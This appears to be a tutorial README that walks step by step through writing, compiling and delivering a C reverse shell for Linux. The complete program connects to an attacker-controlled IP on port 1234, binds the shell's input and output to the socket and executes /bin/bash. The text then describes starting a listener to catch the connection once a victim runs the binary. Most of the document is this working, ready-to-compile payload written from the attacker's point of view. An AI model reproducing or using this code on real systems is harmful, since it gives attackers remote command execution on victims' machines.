# Reverse-Shell

## What are shells?

Shell is the simple piece of program or a code that can be used to gain access to victim machine and command execution on a device like servers, end points, smart phones, etc.

##Types of shell

Thera are two types of shell,
	1. Reverse shell
	2. Bind shell
In here mainly focus to reverse shell and reverse shell scripting.

##Reverse shell

In reverse shell, victim’s machine communicates back to the attacker’s machine to establish connection. Attacker’s machine has up and running listening port to receives the connection from victim’s machine by using command or code execution is achieved.

pic

# Scripting

##Libraries/Headers

There are lot of language available to write reverse shell script. In here reverse shell scripting write using C language. First need to figure out what kind of libraries and headers need to write reverse shell scripting. In C language there are lot of headers available. We mainly focus to some kind of headers that really helpful to write proper reverse shell scripting.

- #include <stdio.h>
- #include <sys/socket.h>
- #include <sys/types.h>
- #include <stdlib.h>
- #include <unistd.h>
- #include <netinet/in.h>
- #include <arpa/inet.h>

- #include <stdio.h> --- which is for standard input and output
- #include <sys/socket.h> --- socket header that include number of functions and structures that will be needed when creating socket
- #include <sys/types.h> --- that contains the definitions of a number of data types that will be used in system calls like socket and connect system calls.
- #include <stdlib.h> --- include variable types, several macros and various number of functions for performing general functions.
- #include <unistd.h> --- define miscellaneous symbolic constants and types as well as miscellaneous functions.
- #include <netinet/in.h> --- contains constant and structures that are needed for internet domain addresses.
- #include <arpa/inet.h> --- include definitions for internet operations

##Main Body

After importing that headers into the reverse shell scripting there are lot of important things to do in the main program body. In here focusing only to the important parts of the body that need to explain little bit. 
In main body of the code need to define two main variables.
	1. int sockt;
	2. int port = 1234;

- int sockt – help to hold the socket of the program. This is actually a system call. Therefore, no need to assign that to any variable.
- int port – this is the variable that hold the reverse shell listening port number.

After that need to define data structure for socket address. In here we can use “struct” data type because this data type help to combine or store different types of data like arrays. And here we use “sockaddr_in” this is essentially defined in netinet header and it help to store all the internet addresses, which we going to use. And finally need to define own structure name. in here it indicates as “revsockaddr”. 

- E.g., struct sockaddr_in revsockaddr;

After that need to call the socket function. Actually, socket function has three main arguments. These arguments define deferent characteristics. The first argument is for define the domain of the connection. It means IPv4 or IPv6. The second argument is for specify the connection. Third argument is for define the protocol.

- E.g., sockt = socket (AF_INET, SOCK_STREAM, 0);
	- AF_INET – define the domain is IPv4
	- SOCK_STREAM – define the connection is two-way connection like between client and server.
	- 0 – when using “0” as third argument, operating system can choose whether to use TCP or UDP for the connection.

Now need to define the data structure of socket address using predefined calls and commands which include in the headers as below.

- revsockaddr.sin_family = AF_INET;

This define the type of connection address which means, what type of internet protocol is going to use for the connection. AF_INET indicate IPv4 is the internet protocol type that is going to use for establish the connection. Sin_family is a part of the netinet header.

- revsockaddr.sin_port = htons(port);

This actually specify the port that use to establish the connection and also this htons(); function help to convert this unsigned integer into network bytes. 

- revsockaddr.sin_addr.s_addr = inet_addr (“192.168.1.100”); 

This specify the internet address. Actually, this address is equal to attacker inet address. It means attacker’s local IP address. After creating the socket address structure, need to implement the connect system call which is help to establish the connection.

- connect (sockt, (struct sockaddr *) &revsockaddr,

In here connect system call is going to be used in conjunction with the socket to and the structure and storing all the values into the “revsockaddr” structure which define and create the beginning of the code. This connect system call helps to connect the socket using previously created socket structure called “revsockaddr”. Also using sizeof(); call from the standard library header we can specify the length of the socket.

- sizeof(revsockaddr); 

Using above call, can get the exact length of the “revsockaddr”. After all of this need to create descriptor. To do that we can use “dup2” command. Using “dup2”, can easily define the file descriptors. Dup2 command is essentially a system call that creates a copy of the file descriptor and this is going to be used for input & output. In here we use sockt as old file descriptor and the “0” for the new file descriptor. And second one also sockt as old file descriptor and “1” for the new file descriptor. And final one also sockt as old descriptor and “2” for new descriptor as below.

- dup2(sockt, 0);
- dup2(sockt, 1);
- dup2(sockt, 2);

finally need to create constant that help to store the command that attacker want to execute. First need to declare the data type character and the constant itself.

- char * const argv [] = {“/bin/bash”, NULL}

argv [] is like a one-dimensional array of strings that going to be storing and execute the command. In here executing “/bin/bash”. Therefore, attacker can get the standard reverse shell from the victim’s machine. Then use execve command to execute the program or commands.

- execve (“/bin/bash”, argv, NULL);

in above command specify the “/bin/bash” or SH whatever terminal attacker want, and specify argv command and NULL.

#Finalized reverse shell script

After completing all of the things mention in the previous section, attacker obtain the complete code that can be used to get reverse shell from the victim’s computer. In here reverse shell script wrote for get the reverse shell from Linux machine.

```javascript
#include <stdio.h> 
#include <sys/socket.h> 
#include <sys/types.h>  
#include <stdlib.h> 
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h> 

int main(void){

        int sockt; 
        int port = 1234; 
        struct sockaddr_in revsockaddr;

        sockt = socket(AF_INET, SOCK_STREAM,0);
        revsockaddr.sin_family = AF_INET;       
        revsockaddr.sin_port = htons(port);
        revsockaddr.sin_addr.s_addr = inet_addr("192.168.1.100");

        connect(sockt, (struct sockaddr *) &revsockaddr, 
        sizeof(revsockaddr));
        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);

        char * const argv[] = {"/bin/bash", NULL};
        execve("/bin/bash", argv, NULL);

        return 0;
}
```

pic

#Create executable

After complete the scripting, using gcc compiler attacker can create the executable file based on the reverse shell script.

- E.g., gcc filename.c -o executable_name

pic

#Delivery mecahnism

After creating executable file, need to find proper deliverable method. These days most of the attckers (hackers) use social engineering techniques to deliver payload to victims. Lot of social engineering techniques are available. In here not going to mention or discuss that kind of social engineering techniques or payload deliverable methods.

#Exploitation

After complete the delivery process of the payload, attacker create the listener to port number which use to create the reverse shell code using his or her machine which have the local IP address include in the reverse shell script.

pic

When victim run the executable file on his or her machine, attacker can simply get the reverse shell from victim’s machine

#References

- T. A. Nidecki, "What is Reverse Shell," acunetix, 26 August 2019. [Online]. Available: https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/.
- "ICMP Reverse Shell," infosec, 4 January 2018. [Online]. Available: https://resources.infosecinstitute.com/icmp-reverse-shell/.
- m. fettis, "Reverse shell !?!," HACKERNOON, 26 August 2017. [Online]. Available: https://hackernoon.com/reverse-shell-cf154dfee6bd.
- "C - Header Files," tutorialspoint, [Online]. Available: https://www.tutorialspoint.com/cprogramming/c_header_files.htm.
- "Header Files," The BSD UNIX Socket Library, [Online]. Available: https://support.sas.com/documentation/onlinedoc/sasc/doc750/html/lr2/zr2bsdhf.htm.
- "Reverse Shell Cheat Sheet," GitHub, [Online]. Available: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md.


